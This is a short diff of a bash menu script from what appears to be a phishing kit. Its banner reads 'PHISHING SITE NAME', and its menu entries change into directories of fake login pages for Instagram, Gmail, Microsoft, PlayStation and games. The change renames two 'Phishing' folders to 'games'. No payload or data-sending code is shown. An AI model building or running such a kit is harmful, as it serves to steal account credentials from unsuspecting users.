@@ -127,8 +127,7 @@ echo -e  "\e[91m........................\e[92mPHISHING SITE NAME\e[91m..........
             cd playstation;;
            7) cd WebPages1
            cd Instagram_advanced_attack;;
-       8) cd 
-          cd Phishing
+       8) cd games
        cd freefire;;
            9) cd WebPages1
  cd pornhub;;
@@ -142,8 +141,7 @@ echo -e  "\e[91m........................\e[92mPHISHING SITE NAME\e[91m..........
  cd Instagram_web;;
       14) cd WebPages1
  cd gmail;;
-       15) cd 
-cd Phishing
+       15) cd games
  cd pubg;;
        16) cd WebPages2
  cd Microsoft;;
